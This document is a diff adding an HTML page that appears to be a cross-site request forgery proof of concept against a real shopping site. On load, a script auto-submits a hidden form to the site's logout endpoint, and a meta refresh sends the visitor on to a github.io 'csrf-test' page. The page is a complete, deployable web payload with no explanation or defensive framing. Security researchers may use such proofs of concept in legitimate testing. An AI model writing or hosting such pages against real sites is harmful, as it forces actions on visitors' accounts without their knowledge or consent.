@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0;url='https://maxhunterr.github.io/csrf-test/index.html'">
+    <title>Logging Out...</title>
+</head>
+<body>
+    <h1>Logging you out...</h1>
+    <form action="https://www.boozt.com/logout" method="GET">
+        <input type="hidden" name="logout" value="true">
+        <button type="submit">Logout</button>
+    </form>
+    <script>
+        // Automatically submitting the form to log out
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
